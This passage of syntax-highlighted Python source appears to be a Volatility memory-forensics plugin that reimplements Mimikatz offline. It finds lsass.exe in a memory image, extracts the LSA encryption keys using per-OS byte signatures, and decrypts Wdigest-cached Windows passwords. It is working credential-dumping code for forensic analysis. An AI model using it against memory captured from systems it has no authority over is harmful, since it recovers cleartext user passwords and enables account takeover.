<span class="keyword">else</span>:</span><br><span class="line">        debug.warning(<span class="string">&#x27;get_key() unable to get BCRYPT_HANDLE_KEY pointer.&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      debug.warning(<span class="string">&#x27;get_key()unable to get first pointer.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_des_key</span>(<span class="params">self, pos</span>):</span></span><br><span class="line">    <span class="keyword">return</span> self.get_key(pos, self.PTR_DES_KEY_OFFSET)</span><br><span class="line">    </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_aes_key</span>(<span class="params">self, pos</span>):</span></span><br><span class="line">    <span class="keyword">return</span> self.get_key(pos, self.PTR_AES_KEY_OFFSET)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">acquire_crypto_material</span>(<span class="params">self</span>):</span></span><br><span class="line">    sigpos = self.find_signature()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sigpos:</span><br><span class="line">      debug.warning(<span class="string">&#x27;[LsaDecryptor] unable to find signature!&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    self.iv = self.get_IV(sigpos)</span><br><span class="line">    self.des_key = self.get_des_key(sigpos)</span><br><span class="line">    self.aes_key = self.get_aes_key(sigpos)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, encrypted</span>):</span></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> NT version specific, move from here in subclasses.</span></span><br><span class="line">    cleartext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    size = <span class="built_in">len</span>(encrypted)</span><br><span class="line">    <span class="keyword">if</span> size:</span><br><span class="line">      <span class="keyword">if</span> size % <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.aes_key <span class="keyword">or</span> <span class="keyword">not</span> self.iv:</span><br><span class="line">          <span class="keyword">return</span> cleartext</span><br><span class="line">        cipher = AES.new(self.aes_key, AES.MODE_CBC, self.iv)</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.des_key <span class="keyword">or</span> <span class="keyword">not</span> self.iv:</span><br><span class="line">          <span class="keyword">return</span> cleartext</span><br><span class="line">        cipher = DES3.new(self.des_key, DES3.MODE_CBC, self.iv[:<span class="number">8</span>])</span><br><span class="line">      cleartext = cipher.decrypt(encrypted)</span><br><span class="line">    <span class="keyword">return</span> cleartext</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Dumping LSA Decryptor&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;     IV (&#123;&#125;): &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(self.iv), self.iv.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;DES_KEY (&#123;&#125;): &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        <span class="built_in">len</span>(self.des_key), self.des_key.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;AES_KEY (&#123;&#125;): &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        <span class="built_in">len</span>(self.aes_key), self.aes_key.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LsaDecryptor_x86</span>(<span class="params">LsaDecryptor, Mimikatz_x86</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;TODO: add description.&quot;&quot;&quot;</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lsass_task</span>):</span></span><br><span class="line">    Mimikatz_x86.__init__(self, lsass_task)</span><br><span class="line">    LsaDecryptor.__init__(self)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LsaDecryptor_x64</span>(<span class="params">LsaDecryptor, Mimikatz_x64</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;TODO: add description.&quot;&quot;&quot;</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lsass_task</span>):</span></span><br><span class="line">    Mimikatz_x64.__init__(self, lsass_task)</span><br><span class="line">    LsaDecryptor.__init__(self)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LsaDecryptor_Vista_x86</span>(<span class="params">LsaDecryptor_x86</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;Class for Windows Vista x86.&quot;&quot;&quot;</span></span><br><span class="line">  <span class="comment"># MIMIKATZ x86: BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]</span></span><br><span class="line">  SIGNATURE= <span class="string">&#x27;\x8b\xf0\x3b\xf3\x7c\x2c\x6a\x02\x6a\x10\x68&#x27;</span></span><br><span class="line">  PTR_IV_OFFSET = <span class="number">11</span>;</span><br><span class="line">  PTR_AES_KEY_OFFSET = -<span class="number">15</span>;</span><br><span class="line">  PTR_DES_KEY_OFFSET = -<span class="number">70</span>;</span><br><span class="line"></span><br><span class="line">  BCRYPT_HANDLE_KEY = construct.Struct(<span class="string">&#x27;KIWI_BCRYPT_HANDLE_KEY&#x27;</span>,</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;size&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;tag&#x27;</span>), <span class="comment"># Tag &#x27;UUUR&#x27;, 0x55555552.</span></span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;ptr_void_algorithm&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;ptr_kiwi_bcrypt_key&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;ptr_unknown&#x27;</span>))</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lsass_task</span>):</span></span><br><span class="line">    LsaDecryptor_x86.__init__(self, lsass_task)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LsaDecryptor_Win7_x86</span>(<span class="params">LsaDecryptor_x86</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;Class for Windows 7 x86.&quot;&quot;&quot;</span></span><br><span class="line">  <span class="comment"># MIMIKATZ x86: BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]</span></span><br><span class="line">  SIGNATURE= <span class="string">&#x27;\x8b\xf0\x3b\xf3\x7c\x2c\x6a\x02\x6a\x10\x68&#x27;</span></span><br><span class="line">  PTR_IV_OFFSET = <span class="number">11</span>;</span><br><span class="line">  PTR_AES_KEY_OFFSET = -<span class="number">15</span>;</span><br><span class="line">  PTR_DES_KEY_OFFSET = -<span class="number">70</span>;</span><br><span class="line"></span><br><span class="line">  BCRYPT_HANDLE_KEY = construct.Struct(<span class="string">&#x27;KIWI_BCRYPT_HANDLE_KEY&#x27;</span>,</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;size&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;tag&#x27;</span>), <span class="comment"># Tag &#x27;UUUR&#x27;, 0x55555552.</span></span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;ptr_void_algorithm&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;ptr_kiwi_bcrypt_key&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;ptr_unknown&#x27;</span>))</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lsass_task</span>):</span></span><br><span class="line">    LsaDecryptor_x86.__init__(self, lsass_task)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LsaDecryptor_Vista_x64</span>(<span class="params">LsaDecryptor_x64</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;Class for Vista x64.&quot;&quot;&quot;</span></span><br><span class="line">  SIGNATURE= <span class="string">&#x27;\x83\x64\x24\x30\x00\x44\x8b\x4c\x24\x48\x48\x8b\x0d&#x27;</span></span><br><span class="line">  PTR_IV_OFFSET = <span class="number">63</span>;</span><br><span class="line">  PTR_AES_KEY_OFFSET = <span class="number">25</span>;</span><br><span class="line">  PTR_DES_KEY_OFFSET = -<span class="number">69</span>;</span><br><span class="line"></span><br><span class="line">  BCRYPT_HANDLE_KEY = construct.Struct(<span class="string">&#x27;KIWI_BCRYPT_HANDLE_KEY&#x27;</span>,</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;size&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;tag&#x27;</span>), <span class="comment"># Tag &#x27;UUUR&#x27;, 0x55555552.</span></span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;ptr_void_algorithm&#x27;</span>),</span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;ptr_kiwi_bcrypt_key&#x27;</span>),</span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;ptr_unknown&#x27;</span>))</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lsass_task</span>):</span></span><br><span class="line">    LsaDecryptor_x64.__init__(self, lsass_task)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LsaDecryptor_Win7_x64</span>(<span class="params">LsaDecryptor_x64</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;Class for Windows 7 x64.&quot;&quot;&quot;</span></span><br><span class="line">  <span class="comment"># MIMIKATZ x64: BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]</span></span><br><span class="line">  SIGNATURE= <span class="string">&#x27;\x83\x64\x24\x30\x00\x44\x8b\x4c\x24\x48\x48\x8b\x0d&#x27;</span></span><br><span class="line">  PTR_IV_OFFSET = <span class="number">59</span>;</span><br><span class="line">  PTR_AES_KEY_OFFSET = <span class="number">25</span>;</span><br><span class="line">  PTR_DES_KEY_OFFSET = -<span class="number">61</span>;</span><br><span class="line"></span><br><span class="line">  BCRYPT_HANDLE_KEY = construct.Struct(<span class="string">&#x27;KIWI_BCRYPT_HANDLE_KEY&#x27;</span>,</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;size&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;tag&#x27;</span>), <span class="comment"># Tag &#x27;UUUR&#x27;, 0x55555552.</span></span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;ptr_void_algorithm&#x27;</span>),</span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;ptr_kiwi_bcrypt_key&#x27;</span>),</span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;ptr_unknown&#x27;</span>))</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lsass_task</span>):</span></span><br><span class="line">    LsaDecryptor_x64.__init__(self, lsass_task)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------    </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wdigest</span>():</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;TODO: add description.&quot;&quot;&quot;</span></span><br><span class="line">  SIGNATURE = <span class="literal">None</span></span><br><span class="line">  FIRST_ENTRY_OFFSET = <span class="number">0</span></span><br><span class="line">  WDIGEST_LIST_ENTRY = <span class="literal">None</span></span><br><span class="line">  MODULE_NAME = <span class="string">&#x27;wdigest&#x27;</span></span><br><span class="line">  MAX_WALK = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, credentials_obj</span>):</span></span><br><span class="line">    self.entries = []</span><br><span class="line">    self.entries_seen = &#123;&#125;</span><br><span class="line">    self.credentials_obj = credentials_obj</span><br><span class="line">    </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">find_signature</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">for</span> mod <span class="keyword">in</span> self.task.get_load_modules():</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">str</span>(mod.BaseDllName).lower() == <span class="string">&#x27;wdigest.dll&#x27;</span>:</span><br><span class="line">        scanner = MemoryScanner(self.task)</span><br><span class="line">        <span class="keyword">return</span> scanner.find_first(mod.DllBase.v(), self.SIGNATURE)</span><br><span class="line">    debug.warning(<span class="string">&#x27;[Wdigest] no wdigest.dll found in lsass process!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_entry_at</span>(<span class="params">self, ptr</span>):</span></span><br><span class="line">    <span class="keyword">if</span> ptr:</span><br><span class="line">      size = self.WDIGEST_LIST_ENTRY.sizeof()</span><br><span class="line">      data = self.get_data(ptr, size)</span><br><span class="line">      <span class="keyword">if</span> data:</span><br><span class="line">        entry = self.WDIGEST_LIST_ENTRY.parse(data)</span><br><span class="line">        <span class="keyword">return</span> entry</span><br><span class="line">        </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_first_entry</span>(<span class="params">self</span>):</span></span><br><span class="line">    position = self.find_signature()</span><br><span class="line">    <span class="keyword">if</span> position:</span><br><span class="line">      ptr_entry = self.get_ptr_with_offset(position + self.FIRST_ENTRY_OFFSET)</span><br><span class="line">      <span class="keyword">if</span> ptr_entry:</span><br><span class="line">        ptr_entry = self.get_ptr(ptr_entry)</span><br><span class="line">        <span class="keyword">if</span> ptr_entry:</span><br><span class="line">          entry = self.get_entry_at(ptr_entry)</span><br><span class="line">          <span class="keyword">if</span> entry:</span><br><span class="line">            <span class="keyword">return</span> entry, ptr_entry</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      debug.warning(<span class="string">&#x27;[Wdigest] no wdigest package found.&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_unicode_string_at</span>(<span class="params">self, ptr, size</span>):</span></span><br><span class="line">    data = self.get_data(ptr, size)</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">      data_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">        data_str = data.decode(<span class="string">&#x27;utf-16-le&#x27;</span>).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">      <span class="keyword">except</span> UnicodeDecodeError <span class="keyword">as</span> ee:</span><br><span class="line">        debug.error(</span><br><span class="line">            <span class="string">&#x27;[Wdigest] get_unicode_string_at() unicode error &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">            ee))</span><br><span class="line">        debug.warning(<span class="string">&#x27;[Wdigest] src data is &lt;&#123;&#125;&gt;&#x27;</span>.<span class="built_in">format</span>(data_str))</span><br><span class="line">      <span class="keyword">return</span> data_str</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      debug.error(<span class="string">&#x27;[Wdigest] get_unicode_string_at() unable to get data&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">add_entry</span>(<span class="params">self, entry, found_at</span>):</span></span><br><span class="line">    <span class="keyword">if</span> entry.usage_count:</span><br><span class="line">      <span class="keyword">if</span> entry.this_entry == found_at:</span><br><span class="line">        user = domain = epwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> entry.user_string_ptr <span class="keyword">and</span> entry.user_len:</span><br><span class="line">          user = self.get_unicode_string_at(</span><br><span class="line">              entry.user_string_ptr, entry.user_max_len)</span><br><span class="line">        <span class="keyword">if</span> entry.domain_string_ptr <span class="keyword">and</span> entry.domain_len:</span><br><span class="line">          domain = self.get_unicode_string_at(</span><br><span class="line">              entry.domain_string_ptr, entry.domain_max_len)</span><br><span class="line">        <span class="keyword">if</span> entry.password_encrypted_ptr <span class="keyword">and</span> entry.password_len:</span><br><span class="line">          epwd = data = self.get_data(</span><br><span class="line">              entry.password_encrypted_ptr, entry.password_max_len)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">          cred_entry = Credential(self.MODULE_NAME, user, domain, epwd)</span><br><span class="line">          self.credentials_obj.add_credential(cred_entry)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">walk_entries</span>(<span class="params">self</span>):</span></span><br><span class="line">    entry, found_at = self.get_first_entry()</span><br><span class="line">    <span class="keyword">if</span> entry:</span><br><span class="line">      walk_num = <span class="number">1</span></span><br><span class="line">      <span class="keyword">while</span> walk_num &lt; self.MAX_WALK:</span><br><span class="line">        self.add_entry(entry, found_at)</span><br><span class="line">        self.entries_seen[found_at] = <span class="number">1</span></span><br><span class="line">        found_at = entry.previous</span><br><span class="line">        entry = self.get_entry_at(found_at)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> entry:</span><br><span class="line">          debug.error(<span class="string">&#x27;Next entry not found!&#x27;</span>)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> entry.this_entry <span class="keyword">in</span> self.entries_seen:</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        walk_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wdigest_x86</span>(<span class="params">Wdigest, Mimikatz_x86</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;TODO: add description.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  WDIGEST_LIST_ENTRY = construct.Struct(<span class="string">&#x27;WdigestListEntry&#x27;</span>,</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;previous&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;next&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;usage_count&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;this_entry&#x27;</span>),</span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;luid&#x27;</span>),</span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;flag&#x27;</span>),</span><br><span class="line">      construct.ULInt16(<span class="string">&#x27;user_len&#x27;</span>),</span><br><span class="line">      construct.ULInt16(<span class="string">&#x27;user_max_len&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;user_string_ptr&#x27;</span>),</span><br><span class="line">      construct.ULInt16(<span class="string">&#x27;domain_len&#x27;</span>),</span><br><span class="line">      construct.ULInt16(<span class="string">&#x27;domain_max_len&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;domain_string_ptr&#x27;</span>),</span><br><span class="line">      construct.ULInt16(<span class="string">&#x27;password_len&#x27;</span>),</span><br><span class="line">      construct.ULInt16(<span class="string">&#x27;password_max_len&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;password_encrypted_ptr&#x27;</span>))</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lsass_task, credentials_obj</span>):</span></span><br><span class="line">    Mimikatz_x86.__init__(self, lsass_task)</span><br><span class="line">    Wdigest.__init__(self, credentials_obj)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wdigest_x64</span>(<span class="params">Wdigest, Mimikatz_x64</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;TODO: add description.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  WDIGEST_LIST_ENTRY = construct.Struct(<span class="string">&#x27;WdigestListEntry&#x27;</span>,</span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;previous&#x27;</span>),</span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;next&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;usage_count&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;align1&#x27;</span>),</span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;this_entry&#x27;</span>),</span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;luid&#x27;</span>),</span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;flag&#x27;</span>),</span><br><span class="line">      construct.ULInt16(<span class="string">&#x27;user_len&#x27;</span>),</span><br><span class="line">      construct.ULInt16(<span class="string">&#x27;user_max_len&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;align2&#x27;</span>),</span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;user_string_ptr&#x27;</span>),</span><br><span class="line">      construct.ULInt16(<span class="string">&#x27;domain_len&#x27;</span>),</span><br><span class="line">      construct.ULInt16(<span class="string">&#x27;domain_max_len&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;align3&#x27;</span>),</span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;domain_string_ptr&#x27;</span>),</span><br><span class="line">      construct.ULInt16(<span class="string">&#x27;password_len&#x27;</span>),</span><br><span class="line">      construct.ULInt16(<span class="string">&#x27;password_max_len&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;align4&#x27;</span>),</span><br><span class="line">      construct.ULInt64(<span class="string">&#x27;password_encrypted_ptr&#x27;</span>))</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lsass_task, credentials_obj</span>):</span></span><br><span class="line">    Mimikatz_x64.__init__(self, lsass_task)</span><br><span class="line">    Wdigest.__init__(self, credentials_obj)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wdigest_Vista_x86</span>(<span class="params">Wdigest_x86</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;Class for Windows Vista x86.&quot;&quot;&quot;</span></span><br><span class="line">  SIGNATURE= <span class="string">&#x27;\x74\x11\x8b\x0b\x39\x4e\x10&#x27;</span></span><br><span class="line">  FIRST_ENTRY_OFFSET = -<span class="number">6</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lsass_task, credentials_obj</span>):</span></span><br><span class="line">    Wdigest_x86.__init__(self, lsass_task, credentials_obj)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wdigest_Win7_x86</span>(<span class="params">Wdigest_x86</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;Class for Windows 7 x86.&quot;&quot;&quot;</span></span><br><span class="line">  SIGNATURE= <span class="string">&#x27;\x74\x11\x8b\x0b\x39\x4e\x10&#x27;</span></span><br><span class="line">  FIRST_ENTRY_OFFSET = -<span class="number">6</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lsass_task, credentials_obj</span>):</span></span><br><span class="line">    Wdigest_x86.__init__(self, lsass_task, credentials_obj)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wdigest_Win7_x64</span>(<span class="params">Wdigest_x64</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;Class for Windows 7 x64.&quot;&quot;&quot;</span></span><br><span class="line">  SIGNATURE= <span class="string">&#x27;\x48\x3b\xd9\x74&#x27;</span></span><br><span class="line">  FIRST_ENTRY_OFFSET = -<span class="number">4</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lsass_task, credentials_obj</span>):</span></span><br><span class="line">    Wdigest_x64.__init__(self, lsass_task, credentials_obj)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wdigest_Vista_x64</span>(<span class="params">Wdigest_x64</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;Class for Windows Vista x64.&quot;&quot;&quot;</span></span><br><span class="line">  SIGNATURE= <span class="string">&#x27;\x48\x3b\xd9\x74&#x27;</span></span><br><span class="line">  FIRST_ENTRY_OFFSET = -<span class="number">4</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lsass_task, credentials_obj</span>):</span></span><br><span class="line">    Wdigest_x64.__init__(self, lsass_task, credentials_obj)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------</span></span><br><span class="line">          </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mimikatz</span>(<span class="params">commands.Command</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;mimikatz offline&quot;&quot;&quot;</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, config, *args, **kwargs</span>):</span></span><br><span class="line">    commands.Command.__init__(self, config, *args, **kwargs)</span><br><span class="line">    self.profile = config.get_value(<span class="string">&#x27;profile&#x27;</span>)</span><br><span class="line">    self.credentials_obj = Credentials()</span><br><span class="line">    </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">find_lsass</span>(<span class="params">self</span>):</span></span><br><span class="line">    addr_space = utils.load_as(self._config)</span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> tasks.pslist(addr_space):</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">str</span>(task.ImageFileName) == <span class="string">&#x27;lsass.exe&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> task</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">init_objects</span>(<span class="params">self, lsass_task</span>):</span></span><br><span class="line">    lsa_decryptor = <span class="literal">None</span></span><br><span class="line">    wdigest = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(self.profile) &gt;= <span class="number">7</span>:</span><br><span class="line">      arch = self.profile[-<span class="number">3</span>:]</span><br><span class="line">      sp = self.profile[-<span class="number">6</span>:-<span class="number">3</span>]</span><br><span class="line">      os = self.profile[:-<span class="number">6</span>]</span><br><span class="line">      <span class="keyword">if</span> os == <span class="string">&#x27;Vista&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> arch == <span class="string">&#x27;x86&#x27;</span>:</span><br><span class="line">          lsa_decryptor = LsaDecryptor_Vista_x86(lsass_task)</span><br><span class="line">          wdigest = Wdigest_Vista_x86(lsass_task, self.credentials_obj)</span><br><span class="line">        <span class="keyword">elif</span> arch == <span class="string">&#x27;x64&#x27;</span>:</span><br><span class="line">          lsa_decryptor = LsaDecryptor_Vista_x64(lsass_task)</span><br><span class="line">          wdigest = Wdigest_Vista_x64(lsass_task, self.credentials_obj)</span><br><span class="line">      <span class="keyword">elif</span> os == <span class="string">&#x27;Win7&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> arch == <span class="string">&#x27;x86&#x27;</span>:</span><br><span class="line">          lsa_decryptor = LsaDecryptor_Win7_x86(lsass_task)</span><br><span class="line">          wdigest = Wdigest_Win7_x86(lsass_task, self.credentials_obj)</span><br><span class="line">        <span class="keyword">elif</span> arch == <span class="string">&#x27;x64&#x27;</span>:</span><br><span class="line">          lsa_decryptor = LsaDecryptor_Win7_x64(lsass_task)</span><br><span class="line">          wdigest = Wdigest_Win7_x64(lsass_task, self.credentials_obj)</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> lsa_decryptor, wdigest</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">calculate</span>(<span class="params">self</span>):</span></span><br><span class="line">    lsass_task = self.find_lsass()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> lsass_task:</span><br><span class="line">      debug.error(<span class="string">&#x27;lsass_task process not found!!&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    lsa_decryptor, wdigest = self.init_objects(lsass_task)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> lsa_decryptor <span class="keyword">or</span> <span class="keyword">not</span> wdigest:</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    lsa_decryptor.acquire_crypto_material()</span><br><span class="line">    wdigest.walk_entries()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> cred <span class="keyword">in</span> self.credentials_obj.credentials:</span><br><span class="line">      cred.decrypt_epwd(lsa_decryptor)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">render_text</span>(<span class="params">self, outfd, data</span>):</span></span><br><span class="line">    self.table_header(outfd, [(<span class="string">&quot;Module&quot;</span>, <span class="string">&quot;8&quot;</span>), </span><br><span class="line">                              (<span class="string">&quot;User&quot;</span>, <span class="string">&quot;16&quot;</span>), </span><br><span class="line">                              (<span 